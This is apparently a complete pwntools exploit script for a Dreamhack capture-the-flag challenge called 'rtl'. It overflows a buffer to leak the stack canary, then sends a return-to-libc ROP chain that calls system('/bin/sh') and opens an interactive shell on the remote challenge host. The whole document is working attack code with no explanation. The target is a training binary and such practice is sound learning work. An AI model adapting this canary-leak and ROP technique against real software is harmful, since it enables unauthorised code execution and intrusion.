from pwn import*

#p = process("./rtl")
p = remote('host3.dreamhack.games',10514)
#gdb.attach(p,api=True)
system_plt = 0x00000000004005d0
binsh = 0x600874
payload = b"a"*0x39
p.send(payload)
p.recvuntil(payload)
canary = int.from_bytes(p.recv(7), "little") << 2*4
print('[+]Canary:', hex(canary))

ret = 0x0000000000400285
rdi_ret = 0x0000000000400853
payload = b'a'*0x38 + p64(canary) + b'a'*8 + p64(ret) + p64(rdi_ret) + p64(binsh) + p64(system_plt)
p.sendline(payload)
p.interactive()
